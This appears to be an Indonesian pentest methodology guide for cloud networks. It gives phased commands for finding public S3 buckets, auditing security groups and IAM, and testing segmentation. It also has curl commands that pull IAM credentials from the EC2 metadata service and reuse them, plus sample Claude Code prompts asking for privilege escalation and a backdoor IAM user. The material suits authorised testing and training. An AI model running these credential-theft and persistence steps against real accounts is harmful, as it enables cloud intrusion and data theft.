# Network Pentest: Cloud Network Infrastructure

**Target:** AWS VPC, Azure VNet, GCP VPC — security group, IAM, metadata endpoint  
**Akses tester:** Dari internet (black box) atau dengan cloud credentials (white box)  
**Durasi:** 3–6 hari

---

## Skenario Umum

| Sub-skenario | Kondisi |
|-------------|---------|
| External cloud audit | Hanya tahu domain/IP — scan dari internet |
| Misconfiguration audit | Punya read-only credentials — audit konfigurasi |
| Instance compromise simulation | Dapat shell di EC2 — test blast radius |

---

## Phase 1: Cloud Asset Discovery

```bash
# Temukan semua aset cloud dari nama organisasi

# AWS — cari S3 bucket publik
# Pola: companyname-backup, companyname-prod, companyname-dev
for name in target targetapp target-backup target-prod target-dev; do
  result=$(curl -s "https://${name}.s3.amazonaws.com" | grep -o "NoSuchBucket\|ListBucketResult")
  echo "$name: $result"
done

# Enumerate subdomain → temukan cloud IP
subfinder -d target.co.id | httpx -title -tech-detect

# Shodan cari cloud assets
shodan search "org:target.co.id" --fields ip_str,port,hostnames
```

**Prompt Claude Code:**
```
Cloud reconnaissance untuk target.co.id:

DNS records menunjuk ke:
- app.target.co.id → 52.xx.xx.xx (AWS EC2, region ap-southeast-1)
- api.target.co.id → 13.xx.xx.xx (AWS EC2)
- static.target.co.id → target-assets.s3.amazonaws.com

Shodan menemukan:
- 52.xx.xx.xx: port 22 open, 80 open, 443 open
- Security group: 0.0.0.0/0 pada port 22!

S3 test:
- target-assets: publik (CDN, aman)
- target-backup: publik → bisa list objects! ← masalah kritis

Buat attack plan berdasarkan temuan ini.
```

---

## Phase 2: AWS Security Testing

```bash
# Dengan read-only credentials (dari white box pentest)
aws configure  # masukkan access key yang diberikan

# S3 bucket enumeration & misconfiguration
aws s3 ls                                          # list semua bucket
aws s3 ls s3://target-backup/                      # list isi bucket
aws s3api get-bucket-acl --bucket target-backup    # cek ACL
aws s3api get-bucket-policy --bucket target-backup # cek policy

# Security group audit
aws ec2 describe-security-groups \
  --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]]' \
  --output table

# IAM over-permission check
aws iam get-account-authorization-details \
  --filter User --output json > iam_audit.json

# CloudTrail — apakah logging aktif?
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name main-trail

# RDS public accessibility
aws rds describe-db-instances \
  --query 'DBInstances[*].[DBInstanceIdentifier,PubliclyAccessible,StorageEncrypted]'
```

---

## Phase 3: IMDS (Instance Metadata Service) Attack

Jika tester mendapat RCE pada EC2 instance, metadata service bisa memberikan IAM credentials:

```bash
# Dari dalam EC2 instance
# IMDSv1 (sangat berbahaya — tidak butuh autentikasi)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role-name

# Hasilnya: temporary AWS credentials!
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}

# Gunakan credentials ini untuk akses AWS resources
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws s3 ls  # akses dengan role EC2
aws iam list-users  # cek apakah role punya akses IAM
```

**Prompt Claude Code:**
```
Berhasil SSRF pada web app di EC2 (app.target.co.id).
SSRF digunakan untuk query IMDS:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/WebAppRole

Response:
{
  "AccessKeyId": "ASIAXXXXXXXX",
  "SecretAccessKey": "xxxxxxxxxxxxxxxxxxxxxxx",
  "Token": "xxx...xxx",
  "Expiration": "2024-01-15T10:30:00Z"
}

Dan role policy WebAppRole ternyata memiliki:
- s3:* pada semua bucket
- ec2:* pada semua resource
- iam:ListUsers

Buat attack scenario:
1. Apa yang bisa dilakukan dengan credentials ini?
2. Cara escalate dari WebAppRole ke admin AWS
3. Cara persist access (buat IAM user backdoor)
4. Dampak bisnis jika full AWS access dikuasai
5. Rekomendasi: enforce IMDSv2, least privilege IAM role
```

---

## Phase 4: Cloud Network Segmentation Testing

```bash
# Test apakah security group benar-benar membatasi traffic

# Dari EC2 instance yang dikompromikan, test akses ke RDS
nc -zv database.target.internal 3306

# Cek VPC peering — apakah ada koneksi ke VPC lain?
aws ec2 describe-vpc-peering-connections

# Test apakah Lambda bisa reach internal resources
aws lambda list-functions  # list semua Lambda
# Cek VPC config setiap Lambda

# Test S3 VPC endpoint — apakah S3 accessible hanya dari VPC?
```

---

## Phase 5: ScoutSuite — Automated Cloud Audit

```bash
# ScoutSuite — comprehensive cloud security audit
pip install scoutsuite

# AWS audit
scout aws --profile pentest-profile --report-dir scoutsuite-report/

# GCP audit  
scout gcp --user-account --project target-project

# Azure audit
scout azure --cli --subscription-id xxx

# Buka report di browser
cd scoutsuite-report && python3 -m http.server 8080
```

---

## Checklist Cloud Network Pentest

```
[ ] S3/Storage bucket discovery (public access?)
[ ] Security group audit (0.0.0.0/0 rules)
[ ] IAM over-permission audit
[ ] CloudTrail/logging status
[ ] RDS/database public accessibility
[ ] EC2 metadata service (IMDSv1 vs v2)
[ ] SSRF → IMDS credential theft testing
[ ] VPC segmentation testing
[ ] Lambda function permissions
[ ] ScoutSuite full audit (jika ada credentials)
[ ] Laporan: kaitkan dengan AWS Well-Architected Security Pillar
```

---

## Durasi Estimasi

| Sub-skenario | Durasi |
|-------------|-----------|----------|
| External cloud reconnaissance | 1–2 hari | 2–3 hari |
| Misconfiguration audit (dengan credentials) | 2–3 hari | 5–7 hari |
| Full cloud pentest | 4–6 hari | 10–14 hari |
